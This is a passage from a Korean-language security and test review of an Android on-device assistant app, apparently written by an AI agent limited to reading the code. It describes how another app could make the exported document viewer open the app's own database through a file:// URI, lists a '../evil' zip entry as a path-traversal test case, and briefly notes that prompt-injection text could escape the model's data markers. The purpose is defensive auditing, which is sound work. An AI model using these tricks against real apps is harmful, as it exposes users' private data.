  - data/src/main/java/com/kosmos/app/data/local/db/dao/AuditDao.kt:18-55 — 활동 기록에는 한 줄만 지우는 기능이 없다(해시 체인이라 지우면 '변경 흔적'으로 뜬다)
  - app/src/main/res/values/strings.xml:472-473 — 메모 초기화 안내는 '직접·자동으로 저장한 메모'뿐
- 검증: 확인. DataResetRepositoryImpl.kt:35-38 메모 대상은 knowledge_note(+NOTE 벡터)만, 활동 기록·대화는 '대화 기록' 대상. BaseAgent.kt:462·465 승인·거절 기록에 `${call.name}: ${approvalRequest.description}` 이 들어가고 AddMemoryToolExecutor.kt:40-45 가 그 설명에 내용 앞 80자를 넣는다. AuditTrailService.kt:84-90 승인·거절은 가림 없이 저장. AuditDao 에는 단건 삭제 쿼리가 없다(조회 @Query 5개만 확인). strings.xml:472-473 메모 초기화 안내는 '직접·자동으로 저장한 메모'뿐. 제안 (2)의 주의점도 맞다 — EpisodeFactExtractor.kt:150-159 가 거절 기록 원문을 읽어 자동 저장을 막는다. 승인 기록 내용 줄이기는 0.41.14 에서 '별도'로 미룬 것과 같은 주제라 새 결정이 필요하고, 지금 값싸게 할 것은 안내 문구(한/영 + 사용 안내)와 ADR-039 한계 한 줄이다. 기능 결함이 아니라 안내 빈틈이라 low.
- 앞선 기록: CHANGELOG 0.41.14 · docs/plans/0.41.14-app-robustness.md:29 — '감사 기록 마스킹(같은 원문이 기억 테이블에 평문, 거절 판정 결합이라 별도)'로 보류 · ADR-039 · docs/checklists/real_use_start.md(대상별 지워지는 것 표) — 메모 단건 삭제 뒤 남는 사본 안내는 기록 없음

### security-8 · 밖에서 여는 두 화면이 받은 주소의 종류를 확인하지 않는다 — 앱 자기 파일을 가리키는 주소도 그대로 연다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 다른 앱이 `file:///data/user/0/com.kosmos.app/databases/kosmos_db` 같은 주소에 text/csv 를 붙여 문서 뷰어를 띄우면, 앱은 자기 권한으로 자기 DB 를 읽어 표로 보여 준다(남의 앱이 내용을 가져가지는 못한다 — 화면에 뜰 뿐이라 피해는 작다). 다만 뷰어의 '채팅으로 보내기'·보관함 넣기로 이어지면 모델 입력이 되고, 녹음 액션은 다른 앱이 KOSMOS 를 띄워 마이크를 켜게 할 수 있다(녹음이 밖으로 나가지는 않음). 안드로이드 앱 보안 점검표의 기본 항목이라 포트폴리오에서 지적받기 쉽다. 실제 재현은 하지 않았다.
- 제안: 들어오는 주소를 한 곳에서 거른다. (1) 작은 순수 함수 `isExternalReadableUri(uri, ownPackage)` — scheme 이 content 이고 authority 가 자기 패키지로 시작하지 않을 때만 참. DocumentViewerActivity.onCreate, ShareIntentHandler.handleIntent(이미지), 입력바 첨부에서 통과한 것만 연다(앱 안에서 연 문서 홈·출처 카드의 SAF 주소는 content 라 영향 없음). 거르면 '열 수 없는 파일' 안내. (2) VOICE_INPUT 은 위젯·타일이 만드는 인텐트에 앱만 아는 표시(예: 프로세스 시작 때 만든 임의 값 extra)를 싣고, 없으면 녹음을 시작하지 않고 채팅만 연다. JVM 테스트로 file://·자기 authority·정상 content 세 경우를 고정한다.
- 근거:
  - app/src/main/AndroidManifest.xml:69-90 — DocumentViewerActivity 는 exported 이고 필터가 MIME 만 정해 file:// 과 content:// 를 모두 받는다
  - app/src/main/java/com/kosmos/app/feature/document/DocumentViewerActivity.kt:54-69 — intent.data 를 검사 없이 viewModel.load 로 넘긴다
  - app/src/main/java/com/kosmos/app/platform/document/DocumentOpener.kt:114-129, 231-237 — 주소 종류 확인 없이 contentResolver.openInputStream 으로 읽어 캐시에 복사한다
  - app/src/main/java/com/kosmos/app/platform/share/ShareIntentHandler.kt:107-115 · app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:426-430 — 공유 이미지의 EXTRA_STREAM 주소도 그대로 연다
  - app/src/main/java/com/kosmos/app/platform/launch/VoiceLaunchHandler.kt:33-36 — MainActivity(exported)는 밖에서 온 VOICE_INPUT 액션도 위젯·타일 것과 구분 없이 받아 녹음 시작 요청으로 처리한다
- 검증: 코드로 확인(실행·재현은 하지 않음). AndroidManifest.xml:69-90 DocumentViewerActivity exported=true, 필터가 mimeType 만 정해 scheme 제한이 없다. DocumentViewerActivity.kt:54-69 intent.data 를 검사 없이 viewModel.load(uri, intent.type). DocumentOpener.kt:114-121 종류 확인 없이 contentResolver 로 열고, getType 이 null 이면 호출자가 준 MIME 힌트로 종류를 정한다 — file:// 로 앱 자기 파일을 가리키고 text/csv 를 붙이면 CSV 로 읽는 경로가 성립한다. 231-237 캐시 복사도 같은 주소를 그대로 연다. ShareIntentHandler.kt:107-115, ChatViewModel.kt:426-430 공유 이미지 주소도 검사 없음. VoiceLaunchHandler.kt:33-36 은 액션 이름만 보고 요청을 낸다(MainActivity exported, AndroidManifest.xml:46). 피해는 '사용자 화면에 뜬다' 수준이고 다른 앱이 내용을 가져가지 못하며, 보내는 앱 쪽도 file 주소 노출 제한을 꺼야 하므로 현실 위험은 낮다. 음성 쪽은 ChatViewModel.kt:233 에서 요청을 받아 처리하는데 녹음이 권한 확인·화면 표시 없이 바로 시작되는지는 끝까지 따라가지 않았다. 포트폴리오 점검 항목으로는 타당, CHANGELOG·architecture·plans 에 관련 기록 없음.

### security-9 · 쓰지 않는 파일 공유 창구(FileProvider)가 캐시 폴더 전체를 범위로 선언돼 있고, 캐시에 DB 사본이 남을 수 있다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 지금은 주소를 내주는 코드가 없어 실제로 새지는 않지만, 누군가 나중에 공유 기능을 붙이면 범위가 '캐시 전체'(DB 사본 ZIP·녹음·남의 문서 사본)라 한 줄 실수로 넓게 열린다. 죽은 선언은 '왜 있느냐'는 질문만 만든다. 또 저장 위치 선택 화면(시스템 파일 앱)이 떠 있는 동안 3.6GB 모델을 쥔 앱은 메모리 회수 대상이 되기 쉬운데, 그때 죽으면 DB 전체 사본이 캐시에 계속 남는다(앱 전용 폴더라 다른 앱은 못 읽지만 지워지지 않고 쌓인다).
- 제안: (1) 매니페스트의 FileProvider 선언과 res/xml/file_paths.xml 을 지운다(쓰는 곳 0 — 지우기 전 grep 으로 다시 확인, 테스트 매니페스트 포함). 공유 기능이 생기면 그때 전용 하위 폴더 하나로 다시 연다. (2) 앱 시작 때(KosmosApp 또는 StartupCoordinator 의 정리 단계) 캐시의 `kosmos_backup_*.zip`·`import_temp_*` 중 오래된 것(예: 1시간 지난 것)을 지우는 정리 함수를 둔다 — 문서 사본은 이미 하루 기준 정리가 있다(DocumentOpener.kt:233-234). MemoryViewModel.onCleared 에서도 남은 ZIP 을 지운다. 순수 함수로 빼 JVM 테스트(시각은 now 인자).
- 근거:
  - app/src/main/AndroidManifest.xml:92-101 — FileProvider 선언(grantUriPermissions=true)
  - app/src/main/res/xml/file_paths.xml:3 — `<cache-path name="export_cache" path="." />` 캐시 폴더 전체
  - 코드 전체 grep — FileProvider·getUriForFile 을 부르는 곳이 없다(내보내기는 0.x 에서 SAF 복사로 바뀜: app/src/main/java/com/kosmos/app/platform/file/BackupFileWriter.kt:33-46)
  - data/src/main/java/com/kosmos/app/data/local/file/ExportImportManager.kt:74-75 — 백업 ZIP(DB 전체)을 캐시에 만든다
  - app/src/main/java/com/kosmos/app/feature/memory/MemoryViewModel.kt:304-318, 356-358 — ZIP 은 저장 완료·취소 때만 지운다. 저장 위치를 고르는 동안 프로세스가 죽거나 화면을 벗어나면 지우는 곳이 없다(onCleared·시작 때 정리 없음)
  - app/src/main/java/com/kosmos/app/platform/speech/AudioRecorder.kt:72 · app/src/main/java/com/kosmos/app/platform/document/DocumentOpener.kt:232 — 같은 캐시에 녹음 파일·열어 본 문서 사본도 놓인다
- 검증: 확인. AndroidManifest.xml:92-101 FileProvider 선언(exported=false, grantUriPermissions=true), app/src/main/res/xml/file_paths.xml:3 cache-path path="."(캐시 전체). app/src·data/src 의 .kt 에서 FileProvider·getUriForFile grep 0건 — 쓰는 곳 없음(매니페스트 주석은 'export ZIP 공유용'이라 적혀 있으나 내보내기는 SAF 복사). ExportImportManager.kt:74-75 가 캐시에 kosmos_backup_<시각>.zip 을 만들고, MemoryViewModel.kt:304-318(저장 뒤 삭제)·356-358(취소 때 삭제) 외에 지우는 곳이 없다 — onCleared grep 0, 'kosmos_backup_'·'import_temp' 를 다루는 곳은 ExportImportManager 두 줄뿐이라 시작 때 정리도 없다. 저장 위치 선택 중 프로세스가 죽으면 DB 사본이 캐시에 남는 경로가 성립한다(앱 전용 폴더라 유출은 아니고 잔류). DocumentOpener.kt:233-234 문서 사본은 하루 기준 정리가 있음도 맞다. 지우기 전 테스트 매니페스트·androidTest 에서 한 번 더 grep 할 것. 기록 없음. 정리 항목이라 low.

### security-10 · '민감 정보 가리기'(Redaction)가 하는 일이 이름보다 훨씬 좁다 — 이메일·휴대폰 번호만, 일부 기록에만
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: core/security 에 'PII 마스킹'이라는 이름의 클래스가 있으면 면접관은 무엇을 어디까지 가리는지 묻는다. 실제로는 두 패턴뿐이고, 가린 활동 기록 옆에 가리지 않은 원문 대화가 같은 DB·같은 백업 ZIP 에 있어 보호 효과는 거의 없다(실제 역할은 '기록이 너무 길어지지 않게 자르기'). 반대로 정작 필요한 곳(밖으로 나가는 검색어, 승인 기록의 메모 내용)에는 안 쓰인다. 기능 결함은 아니고 이름·설명과 실제의 차이라 유지보수와 설명 부담이다.
- 제안: 둘 중 하나로 정리한다. (가) 역할을 솔직하게: KDoc 을 '활동 기록 항목의 길이 상한 + 화면에 보일 때 이메일·휴대폰 번호 가리기(저장 보호 수단이 아님 — 원문은 대화 표에 있다, ADR-032)'로 고치고 '외부 전송 데이터' 문구를 지운다. (나) 쓰임을 넓힌다: security-6 의 위키 검색어에 적용해 '밖으로 나가는 글에는 반드시 거친다'는 한 가지 규칙을 실제로 만든다 — 이 경우 KDoc 의 '외부 전송'이 사실이 된다. 어느 쪽이든 README 의 보안 설명에는 과장 없이 한 줄만. 단언을 건드리지 않는 범위(주석·적용 지점 추가)라 테스트 수정은 필요 없다.
- 근거:
  - core/src/main/java/com/kosmos/app/core/security/Redaction.kt:17-30 — 이메일과 01x 휴대폰 번호 두 패턴만 바꾸고 500자에서 자른다(비밀번호·주민번호·카드·유선 번호 등은 그대로)
  - domain/src/main/java/com/kosmos/app/domain/audit/AuditTrailService.kt:53-54, 78, 97 — 모델 실행·툴 결과·검색어에만 적용
  - domain/src/main/java/com/kosmos/app/domain/audit/AuditTrailService.kt:84-94 — 승인·거절·오류 기록은 가리지 않고 그대로 저장
  - core/src/main/java/com/kosmos/app/core/security/Redaction.kt:5-6 — 설명은 '감사 로그 및 외부 전송 데이터'인데 외부로 나가는 글(위키 검색어)에는 쓰이지 않는다
  - data/src/main/java/com/kosmos/app/data/local/db/entity/ConversationEntity.kt:8 — 같은 DB 의 conversation 표에 원문 대화가 그대로 있다
- 검증: 사실은 맞다: core/.../security/Redaction.kt:17-30 이메일·01x 휴대폰 두 패턴 + 500자 자르기, KDoc 5-6행은 '감사 로그 및 외부 전송 데이터'. 쓰는 곳은 AuditTrailService.kt:145 한 곳뿐(grep 확인)이고 53-54·78·97행(모델 실행·툴 결과·검색어)에만 적용, 84-94행 승인·거절·오류는 그대로 저장. 다만 '가림이 일관되지 않고 원문이 다른 표에 평문'이라는 핵심은 0.41.14 대조에서 이미 알고 '별도'로 미룬 것이라 새 발견이 아니다. 새로 남는 것은 KDoc 의 '외부 전송 데이터' 문구가 사실과 다르다는 점(주석 한 줄 수정)과 architecture.md:238 표의 설명 정도다. (나)안은 security-6 과 같은 일이므로 따로 항목으로 둘 필요 없이 그쪽에 합치면 된다.
- 앞선 기록: CHANGELOG 0.41.14 · docs/plans/0.41.14-app-robustness.md:29 — '감사 기록 마스킹(같은 원문이 기억 테이블에 평문 — 일관성 문제, 거절 판정 결합이라 별도)'로 보류. docs/architecture.md:238 은 Redaction 을 '민감 정보 마스킹'으로 소개

<details><summary>읽은 범위</summary>

[읽은 것 — 직접 전부 읽음] app/src/main/AndroidManifest.xml, res/xml/file_paths.xml·data_extraction_rules.xml, .gitignore, gradle.properties(변경분), gradle/libs.versions.toml, app/build.gradle.kts, ModelDownloadService.kt, NetworkModule.kt, WikipediaSearchToolImpl.kt, SearchWikipediaToolExecutor.kt, ApprovalRules.kt, ExportImportManager.kt, BackupFileWriter.kt, AuditHashChain.kt, AuditDao.kt, AuditRepositoryImpl.kt, AuditTrailService.kt, DataResetRepositoryImpl.kt, Redaction.kt, AppLogger.kt, RuntimeDiagnostics.kt, ShareIntentHandler.kt, AttachmentReader.kt, VoiceLaunchHandler.kt, DocumentViewerActivity.kt, DocumentAccess.kt, DocumentOpener.kt(1~260행), DocumentSupport.kt(상한·XML 파서), AttachedDocumentBlock.kt, DataMarker.kt, EpisodeFactExtractor.kt, ExtractFactsUseCase.kt, EpisodeTranscript.kt, KnowledgeAutoSaveFilter.kt, GemmaRuntimeManager.kt(파일 탐색부). 부분만 읽음: BaseAgent.kt(툴 실행·승인·감사 구간), AssistantOrchestrator.kt(저장 구간), GetScheduleToolExecutor.kt, GetTodayScheduleUseCase.kt, GenerateBriefingUseCase.kt, MorningBriefingGenerator.kt, AndroidCalendarTool.kt(grep), MemoryViewModel.kt(내보내기 구간), ChatBubbles.kt·BriefingCard.kt(마크다운 구간), SpeechOutput.kt(grep), ModelManagementScreen.kt. 로그 호출 91곳은 목록 전체를 훑었다. 문서: CHANGELOG 0.42.0·0.41.16·0.41.4 항목, ADR-006·032·039·040, docs/plans 0.42.0·0.42.10·0.43.0 을 grep 으로 대조. compose-richtext 1.0.0-alpha05 소스 jar 는 스크래치패드에 풀어 이미지 처리부만 읽었다(저장소는 건드리지 않음). git 은 읽기 명령(ls-files·log·grep·remote)만 썼다.

[못 한 것] gradle·adb·실험 실행 금지라 실제 재현은 하나도 하지 않았다 — security-1 의 '요청이 실제로 나간다'는 코드와 묶음 목록(lint 의존성 모델의 package 구간)으로 확인한 것이고, security-2·3 의 '모델이 실제로 따른다/저장한다'는 미측정 추정이다(그래서 confidence=medium). 그래프 도구는 쓰지 않고 grep·파일 읽기로만 확인했다. 의존성의 알려진 취약점은 버전 목록만 봤다(OkHttp 5.5.1·Room 2.8.5·WorkManager 2.12.0 등 최근 판, 0.41.5 에서 최신화 — 외부 취약점 DB 조회는 하지 않음). 저장소 비밀: 추적 파일에 키·토큰 패턴 없음, local.properties·keystore 추적 이력 없음, 실제 대화 파생 파일(kosmos_db·exp33 출력) 추가 이력 없음 확인. git 이력 전체 내용 검색은 하지 않았다.

[확인했고 문제없다고 본 것] allowBackup=false + dataExtractionRules 전 영역 제외, 리시버·서비스 exported 설정, PendingIntent 전부 IMMUTABLE, 가져오기 ZIP 의 경로 탈출·압축 폭탄 방어와 스키마 버전 검사, XML 외부 엔티티 차단, 위키 언어 코드 검증(호스트 조작 차단), 낭독의 오프라인 음성 선택, 공유 글은 입력란에만 들어가고 자동 전송되지 않음, 평문 HTTP 는 기본 차단(별도 네트워크 보안 설정 없음).

[버린 항목 — 6건]
1) DB·백업 ZIP 암호화: ADR-032 에서 사용자 결정으로 기각 — 뒤집지 않음.
2) 지운 행이 DB 빈 페이지에 남아 백업에 실린다: 안드로이드 기본 SQLite 는 지울 때 덮어쓰도록 빌드되는 것으로 알고 있고(기억에 의존, 미확인) 내보내기 전 WAL 도 비우므로 근거 부족으로 제외.
3) 해시 체인의 꼬리 자르기·체인 전 기록 미검증·다시 계산: ADR-039 와 코드 주석에 이미 한계로 적혀 있음(체인 머리를 기기 밖에 적기).
4) 자료 표지의 끝 표시(`[자료 끝]`, `"""`)가 자료 안에 들어 있을 때의 탈출: 4B 모델에서 표지 자체가 약한 방어라 효과가 불확실하고 모델 입력 변경이라 실측이 필요 — 10건 밖으로.
5) 가져온 백업의 스키마 지문이 달라 다음 실행부터 크래시가 반복될 수 있는 경우: 보안보다 데이터 안정성 영역이고 정상 경로로는 생기기 어려워 제외(데이터 담당 영역에서 볼 만함).
6) 모델 관리 화면의 사용자 지정 주소에 호스트 제한 없음: 사용자 본인 입력이고 HTTPS 만 통과 — 위협 아님.
그 밖에 화면 가리기·릴리스 전환·알림 잠금 화면 노출은 결정 사항이라 내지 않았다.

[곁다리 관찰] scratch/lab/regression/last_run_019_off.json 이 추적도 무시도 아닌 상태다(.gitignore 는 last_run.json 만) — `git add -A` 때 딸려 들어갈 수 있다. 코드 주석·CHANGELOG 의 예시 값("현관 비밀번호 2580" 등)이 실제 기기 대화에서 온 값인지는 판단할 수 없었다 — 공개 저장소이므로 사용자가 한 번 확인할 가치가 있다.

</details>

## 테스트·빌드 (tests)

### tests-1 · DB 마이그레이션 테스트가 단계별 손 복사 DDL 대조뿐이고, 처음부터 끝까지 올린 뒤 Room 이 실제로 여는지는 아무도 확인하지 않는다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 실제 기억·대화가 든 DB 는 휴대폰 한 대에만 있다. 다음에 스키마를 올릴 때 (a) SCHEMA_VERSION 만 올리고 마이그레이션 등록을 빠뜨리거나 (b) 손으로 옮겨 적은 기대 DDL 자체가 틀리거나 (c) 색인·기본값처럼 표 DDL 밖의 차이가 나면, JVM 게이트는 녹색인데 휴대폰에서는 앱이 켜질 때마다 죽는다. 지금 테스트는 '각 단계가 내가 적은 문자열과 같은가'만 보고, Room 이 실제로 하는 검사(전체 스키마 지문 대조)는 한 번도 태우지 않는다. 실사용 단계에서 가장 비싼 종류의 사고이고, 포트폴리오에서도 '데이터 보존을 어떻게 보장했나'의 답이 약해진다.
- 제안: 테스트 1개 파일 추가(제품 코드 불변). ① Robolectric 에서 파일 DB 를 SupportSQLiteOpenHelper 로 버전 3 으로 만들되, 표 생성 SQL 은 '../data/schemas/com.kosmos.app.data.local.db.KosmosDatabase/3.json' 의 createSql 을 org.json 으로 읽어 그대로 실행(손 복사 제거) → 대표 행 몇 개 삽입 → 닫기. ② 같은 파일을 Room.databaseBuilder(...).addMigrations(*KosmosMigrations.ALL) 로 열어 openHelper.writableDatabase 를 한 번 만진다 — Room 이 14 까지 올리고 스키마 지문을 검증하므로 어긋나면 여기서 실패한다. 삽입한 행이 남아 있는지도 단언. ③ 순수 단언 하나: ALL 을 startVersion 순으로 정렬했을 때 빈틈이 없고 마지막 endVersion == SCHEMA_VERSION. ④ 여유가 되면 각 중간 버전(4~13)에서 시작하는 같은 검사를 반복문으로. 기존 단계별 테스트는 그대로 둔다(데이터 재인코딩 검증 가치).
- 근거:
  - data/src/main/java/com/kosmos/app/data/di/DatabaseModule.kt:39-43 — 업그레이드는 명시적 마이그레이션만 허용(빠지거나 어긋나면 앱 시작 때 IllegalStateException), 파괴적 재생성은 다운그레이드에만
  - app/src/test/java/com/kosmos/app/data/ReminderMigrationTest.kt:38-49 — 이전·이후 표 DDL 을 스키마 JSON 에서 손으로 옮겨 적은 문자열과 비교(다른 마이그레이션 테스트 8개도 같은 방식)
  - app/src/test/java/com/kosmos/app/data/KnowledgeEmbeddingMigrationTest.kt:28-35 — MigrationTestHelper 를 안 쓰는 이유(스키마 JSON 이 테스트 assets 에 안 합쳐짐)와 'Room 의 스키마 검증을 잃는다'는 것을 스스로 적어 둠
  - app/src/test/java/com/kosmos/app/data/AuditChainRepositoryTest.kt:135-165 — 13→14 는 기본값과 색인 '존재'만 확인, 표 DDL 을 14.json 과 대조하지 않음
  - grep 결과: app/src/test 에 MIGRATION_3_4 참조 0건, KosmosMigrations.ALL 의 연속성(마지막 도착 버전 == KosmosDatabase.SCHEMA_VERSION)을 보는 테스트 0건(SCHEMA_VERSION 참조는 ExportImportSafetyTest.kt:33 한 곳)
  - app/src/test/java/com/kosmos/app/assistant/context/PromptFixtureExportTest.kt:341 — 테스트가 '../scratch/lab/fixtures' 상대 경로로 저장소 파일을 이미 읽고 쓴다(= '../data/schemas/…/N.json' 도 같은 방식으로 읽을 수 있다)
- 검증: 직접 확인: DatabaseModule.kt:39-43 은 addMigrations(*KosmosMigrations.ALL) + 다운그레이드에서만 파괴적 재생성. KosmosMigrations.kt:25-269 에 3→4 ~ 13→14 11개, KosmosDatabase.kt:61 SCHEMA_VERSION=14. app/src/test 의 마이그레이션 참조는 4_5·5_6·6_7·7_8·8_9·9_10·10_11·11_12·12_13·13_14 뿐이고 MIGRATION_3_4 와 KosmosMigrations.ALL 참조는 0건(SCHEMA_VERSION 은 ExportImportSafetyTest.kt:33 한 곳). ReminderMigrationTest.kt:32-43 은 손으로 옮긴 DDL 문자열, AuditChainRepositoryTest.kt:135-165 는 기본값과 색인 존재만 본다. data/schemas 에 2~14.json 이 있어 제안한 방식(스키마 JSON 의 createSql 을 읽어 실행 후 Room 으로 열기)은 성립한다. 다만 심각도는 낮춘다 — 지금 휴대폰 DB 는 이미 14 이고 위험은 '다음에 스키마를 올릴 때'만 생기며, 어긋나면 앱이 시작에서 죽을 뿐 DB 파일은 그대로라(업그레이드 경로는 파괴적 재생성이 아님) 새 빌드로 복구된다. 손 DDL 대조 자체는 일부러 고른 방식이므로 '기존 테스트는 그대로 두고 추가만' 이라는 제안 범위가 맞다. 테스트 실행 폴더가 app/ 인지(상대 경로 '../data/schemas')는 PromptFixtureExportTest 의 '../scratch/lab/fixtures' 전례로 뒷받침되나 직접 돌려 보지는 않았다.
- 앞선 기록: CHANGELOG 1452행 'MIGRATION_2_3 누락 — 조치하지 않는다(사용자 결정)'(버전 2 시작 경로만 해당). KnowledgeEmbeddingMigrationTest.kt:28-35 주석에 MigrationTestHelper 를 안 쓰는 이유와 '손 DDL 대조로 대체' 결정 기록. docs/plans/0.38.2-chat-redesign.md:14 '손 DDL 비교 테스트(MigrationTestHelper 아님)'. 전체 경로·연속성 검사에 대한 기록은 없음.

### tests-2 · 모델 회귀 세트(run.py)가 앱 가드·툴 결과 문구를 손으로 베껴 쓰고 있고, 지금 이미 세 군데가 앱과 다르다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 회귀 세트는 모델 입력을 바꿀 때마다 '새로 깨진 것 0' 을 판정하는 유일한 근거이고, 토큰 여유가 약 20토큰이라 이 판정에 크게 기댄다. 그런데 앱과 같은지 지켜 주는 장치가 없어 흉내가 조용히 낡는다 — 낡으면 세트는 앱이 아닌 다른 것을 재고, 결론이 틀렸다는 사실도 드러나지 않는다(시스템 지시에 대해 PromptFixtureExportTest 가 막으려던 바로 그 문제). 실제로 0.42.7 에서 흉내와 앱의 인자 키 모양이 달라 결함을 둘 다 못 잡은 전례가 있다. 포트폴리오에서 '온디바이스 모델 행동을 어떻게 회귀 검증했나'가 핵심 방어 지점인데, 흉내의 정확성을 물으면 답이 '손으로 맞춘다'가 된다.
- 제안: 시스템 지시와 같은 방식으로 '앱에서 내보내고 실험실이 읽는다'로 바꾼다. ① PromptFixtureExportTest 에 내보내기 하나 추가: guards.json — ToolCallGuards.REPEAT_NOT_SAVE(_EN), MemoSaveIntent.ASK_FIRST(_EN), ScheduleTimeIntent.NO_TIME/NO_CLOCK(_EN), 지난 시각 문구, 기억 검색 빈 결과·꼬리 문구, DataMarker 머리·꼬리 등 문구 상수. 정규식은 지금 private 이므로 각 object 에 internal val 로 패턴 문자열을 노출하거나, 더 간단히는 '대표 문장 표(입력 → 막음/통과)'를 Kotlin 판정 함수로 계산해 내보내고 run.py 가 시작할 때 자기 흉내로 같은 표를 계산해 다르면 즉시 중단하게 한다(자바·파이썬 정규식 문법 차이를 피할 수 있다). ② 툴 설명은 선언 클래스의 @Tool/@ToolParam 을 리플렉션으로 읽어 tools.json 으로 내보내고 kosmos_lab.py 시작 시 자기 docstring 과 비교. ③ 위 세 불일치는 먼저 앱 쪽을 정본으로 흉내를 맞추고 회귀 세트를 한 번 돌려 기준과의 차이를 CHANGELOG 에 적는다(앱 모델 입력은 바꾸지 않는다 — 실험실만 고친다).
- 근거:
  - domain/src/main/java/com/kosmos/app/domain/agent/RefusalTurns.kt:20 — 영어 거절 판정의 뒤보기 '(?![^.!\\n]{0,40}\\b(but|however|…' (물음표 없음)
  - scratch/lab/regression/run.py:197-203 — 같은 자리 '(?![^.!?\n]{0,40}\b(but|however|…' (물음표가 더 들어감) — 판정식이 다르다
  - app/src/main/java/com/kosmos/app/assistant/tool/AddReminderToolExecutor.kt:86 — 성공 결과 "리마인더 등록: ${draft.displayTime}에 '${draft.content}' 알림"
  - scratch/lab/regression/run.py:364 — 흉내는 f"리마인더 등록: '{content}' 알림" (시각 표기가 빠짐 — 모델이 받는 툴 결과가 앱과 다르다)
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:553-559 — 지난 시각 되돌림은 status·tool·field·reason·message 다섯 칸
  - scratch/lab/regression/run.py:361-362 — 흉내는 {"status":"error","message":…} 두 칸만
  - scratch/lab/kosmos_lab.py:40-117 — 툴 설명·인자 설명 전체를 손으로 옮긴 사본(지금은 일치). PromptFixtureExportTest.kt:112-117 은 시스템 지시·턴 리마인더·툴 '이름'만 내보내고 설명과 가드 문구·정규식은 내보내지 않는다
  - scratch/lab/regression/run.py:4 — 'Kotlin 쪽 정규식을 바꾸면 여기도 바꾼다' (사람 기억에 의존)
- 검증: 세 불일치 모두 직접 확인. (1) RefusalTurns.kt:20 뒤보기는 '[^.!\\n]{0,40}', run.py 의 REFUSAL_TURN 은 '[^.!?\n]{0,40}' — 물음표가 더 들어가 있다(영향은 '…? but' 같은 드문 문장뿐이라 작다). (2) AddReminderToolExecutor.kt:85-86 성공 문구는 "리마인더 등록: ${displayTime}에 '${content}' 알림", run.py:367 은 "리마인더 등록: '{content}' 알림" — 시각 표기가 빠져 모델이 받는 툴 결과가 앱과 다르다(가장 실질적인 차이). (3) BaseAgent.kt:553-559 인자 오류 되돌림은 status·tool·field·reason·message 다섯 칸, run.py:364 리마인더 지난 시각 흉내는 status·message 두 칸. run.py:4 주석이 'Kotlin 쪽 정규식을 바꾸면 여기도 바꾼다'로 사람 기억에 맡긴다. PromptFixtureExportTest.kt:109-117 은 시스템 지시 2종·턴 리마인더·툴 이름만 내보낸다. run.py·baseline.json·kosmos_lab.py 는 git 추적 파일이라 '실험 스크립트는 일회용' 결정의 예외(고정 회귀 세트)에 해당 — 제안은 결정과 충돌하지 않는다. 주의: 흉내를 앱에 맞추면 기준값(baseline.json)과 차이가 날 수 있으니 회귀 세트 재실행과 CHANGELOG 기록이 따라야 하고, 앱 문구를 바꾸는 쪽으로 풀면 모델 입력 변경이 된다(앱을 정본으로 두는 제안 방향이 맞다). kosmos_lab.py:40-117 의 '지금은 일치'는 직접 대조하지 않았다.
- 앞선 기록: AGENTS §2-⑤ '툴 미러는 앱 선언과 함께 갱신'·'앱 가드의 판정식을 바꾸면 세트의 흉내도 같이 고친다'(수동 규칙). CHANGELOG 0.42.7(흉내와 앱의 인자 키 모양 차이로 결함을 못 잡음) — 후보 인용, 직접 재확인은 하지 않음. 자동 대조 장치에 대한 기록은 없음.

### tests-3 · 백업 만들기 → 복원 전체 경로(압축·검증·교체)에 테스트가 없다 — 조각 함수 둘만 검증된다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 디버그 빌드로 매일 쓰는 단계에서 백업은 휴대폰 고장·재설치·실수에 대한 유일한 안전망이다. '만든 백업이 실제로 복원되는가'(체크포인트 뒤 DB 파일이 온전한가, manifest 가 읽히는가, 복원 뒤 Room 이 그 파일을 여는가)와 방어 코드(경로 탈출 항목 거부, manifest 없음, 더 새 버전 거부, 압축 폭탄 상한)가 한 번도 자동으로 실행되지 않는다. copyWithLimit 의 경계(상한과 정확히 같을 때 거부)처럼 눈으로 놓치기 쉬운 분기도 있다. 백업이 깨진 것을 필요한 순간에야 알게 되는 유형이라 미리 고정할 가치가 크다.
- 제안: Robolectric 테스트 1개 파일(제품 코드 불변). 파일 DB 로 KosmosDatabase 를 열어 메모·대화 몇 행을 넣고 ① createExportZip → zip 안에 manifest.json 과 kosmos_db 가 있고 readSqliteUserVersion == SCHEMA_VERSION ② 행을 지운 뒤 그 zip 을 ShadowContentResolver 에 등록해 restoreFromZip → 성공, DB 를 다시 열어 행이 돌아왔는지 ③ 거부 경로 네 가지: '../evil' 항목이 든 zip, manifest 없는 zip, manifest version 이 다른 zip, user_version 을 SCHEMA_VERSION+1 로 고친 DB — 모두 Failure 이고 기존 DB 파일 바이트가 그대로인지 단언.
- 근거:
  - data/src/main/java/com/kosmos/app/data/local/file/ExportImportManager.kt:49-116 — createExportZip(WAL 체크포인트 → manifest + DB 압축), :126-193 restoreFromZip(해제 → manifest 판 확인 → 스키마 버전 범위 → 교체), :199-239 extractZipSafely(경로 탈출·항목 수·총량 상한)
  - app/src/test/java/com/kosmos/app/data/ExportImportSafetyTest.kt:29-86 — 검증 대상은 isRestorableVersion 과 replaceDatabaseFiles(가짜 바이트 파일) 뿐
  - grep 결과: app/src/test·domain/src/test 에서 ExportImportManager 참조 0건(createExportZip·restoreFromZip·extractZipSafely 호출 없음). MemoryBackupStateTest 는 화면 상태만 mock 으로 본다
  - app/src/test/java/com/kosmos/app/integration/MultimodalChatE2ETest.kt:162-163 — ShadowContentResolver.registerInputStream 으로 content URI 를 흉내 내는 방법이 이미 저장소에 있다
